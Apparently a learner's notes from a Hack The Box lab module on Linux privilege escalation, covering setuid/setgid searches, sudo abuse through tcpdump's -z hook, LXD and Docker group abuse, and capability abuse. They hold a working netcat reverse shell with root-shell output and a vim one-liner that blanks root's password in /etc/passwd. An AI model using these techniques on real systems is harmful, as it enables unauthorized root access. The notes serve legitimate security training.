# 🛩️ Permissions-based Privilege Escalation

## Special Permissions

The `Set User ID upon Execution` (`setuid`) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges

```shell-session
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them.

```
 find / -uid 0 -perm -6000 -type f 2>/dev/null
 find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

For this type of privesc it's good to know the [GTFOBins](https://gtfobins.github.io/) project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions.

## Sudo Rights Abuse

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges.\
When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`

```shell-session
htb_student@NIX02:~$ sudo -l
<SNIP>
(root) NOPASSWD: /usr/sbin/tcpdump
```

&#x20;if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

```shell-session
htb_student@NIX02:~$ man tcpdump
<SNIP> 
-z postrorate-command   
```

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. Let's  create the shell script `.test` containing a reverse shell and execute it ->

```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

and the content of the .test file would be our reverse shell ->

```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
```

Now we can start our listener on our attackbox ->

```shell-session
nc -lnvp 443
```

&#x20;and run `tcpdump` as root with the `postrotate-command`.

```shell-session
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

we sould get our shell back pretty quickly:

```shell-session
ElFelixi0@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
```

## Privileged Groups

#### LXC / LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container

&#x20;this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) has more information on each step.

We can confirm we're in the group with the id command ->

```shell-session
devops@NIX02:~$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Unzip the Alpine image.

```shell-session
unzip alpine.zip 
```

Start the LXD initialization process.

```shell-session
lxd init
```

Import the local image.

```shell-session
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.

```shell-session
lxc init alpine r00t -c security.privileged=true
```

Mount the host file system.

```shell-session
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

Finally, spawn a shell inside the container instance.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user. This could be done for other directories such as `/etc` which could be used to retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

### Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.

### ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

_**Use the privileged group rights of the secaudit user to locate a flag.**_

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Went and found the /var/log file and looked at every adm group until i found one log file with the flag in it

## Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted

we can use the `setcap` command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.

Let's say we want to set the `cap_net_bind_service` capability for an executable

```shell-session
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the `cap_net_bind_service` capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.

Here are some interesting capabilities ->

<table data-header-hidden><thead><tr><th width="253"></th><th></th></tr></thead><tbody><tr><td><strong>Capability</strong></td><td><strong>Description</strong></td></tr><tr><td><code>cap_sys_admin</code></td><td>Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td></tr><tr><td><code>cap_sys_chroot</code></td><td>Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td></tr><tr><td><code>cap_sys_nice</code></td><td>Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td></tr><tr><td><code>cap_sys_time</code></td><td>Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td></tr><tr><td><code>cap_sys_resource</code></td><td>Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td></tr><tr><td><code>cap_sys_module</code></td><td>Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.</td></tr><tr><td><code>cap_net_bind_service</code></td><td>Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td></tr></tbody></table>

When a binary is executed with capabilities, it can perform the actions that the capabilities allow.

Here are some examples of values that we can use with the `setcap` command

<table data-header-hidden><thead><tr><th width="126"></th><th></th></tr></thead><tbody><tr><td><strong>Capability Values</strong></td><td><strong>Description</strong></td></tr><tr><td><code>=</code></td><td>This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.</td></tr><tr><td><code>+ep</code></td><td>This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.</td></tr><tr><td><code>+ei</code></td><td>This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.</td></tr><tr><td><code>+p</code></td><td>This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.</td></tr></tbody></table>

Here are some Linux capabilities that can be used to escalate a user's privileges to `root`

<table data-header-hidden><thead><tr><th width="214"></th><th></th></tr></thead><tbody><tr><td><strong>Capability</strong></td><td><strong>Desciption</strong></td></tr><tr><td><code>cap_setuid</code></td><td>Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the <code>root</code> user.</td></tr><tr><td><code>cap_setgid</code></td><td>Allows to set its effective group ID, which can be used to gain the privileges of another group, including the <code>root</code> group.</td></tr><tr><td><code>cap_sys_admin</code></td><td>This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the <code>root</code> user, such as modifying system settings and mounting and unmounting file systems.</td></tr><tr><td><code>cap_dac_override</code></td><td>Allows bypassing of file read, write, and execute permission checks.</td></tr></tbody></table>

If we want to try and use this, we need to suse this one liner to find all binary executables in the directories where they are typically located and then uses the `-exec` flag to run the `getcap` command on each, showing the capabilities that have been set for that binary.

```shell-session
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

An example could be we get the following output ->

```shell-session
/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
```

Now to exploit let's say the first one ->

```shell-session
ElFelixi0@htb[/htb]$ getcap /usr/bin/vim.basic

/usr/bin/vim.basic cap_dac_override=eip
```

because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it.

We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file

```shell-session
/usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```shell-session
ElFelixi0@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
ElFelixi0@htb[/htb]$ cat /etc/passwd | head -n1

root::0:0:root:/root:/bin/bash
```

&#x20;we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.

* `:%s/^root:[^:]*:/root::/`:
  * `:%s` is a substitution command in Vim that means "substitute in the whole file."
  * `^root:[^:]*:` matches the line where the root user's password hash is stored in `/etc/passwd`. The pattern `[^:]*` matches anything between `root:` and the next colon (`:`), which represents the password hash field.
  * `root::` replaces the password hash with nothing (i.e., it effectively deletes the password hash), leaving the root user without a password (i.e., no authentication required for root login).
* `\nwq!`:
  * &#x20;is a newline character, so Vim moves to the next command.
  * `wq!` writes (saves) the changes to the file and quits Vim forcibly (`!` ensures that it happens without confirmation).
* **`/usr/bin/vim.basic -es /etc/passwd`**:
  * This part runs the command using Vim in "silent" and "ex mode" (`-es`):
    * `-e`: Starts Vim in "ex mode," a streamlined version of Vim used for executing commands non-interactively (without opening the Vim editor UI).
    * `-s`: Silent mode, which suppresses any output.
  * The file being edited is `/etc/passwd`.

_**Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.**_

<figure><img src="../../../.gitbook/assets/image (1475).png" alt=""><figcaption></figcaption></figure>
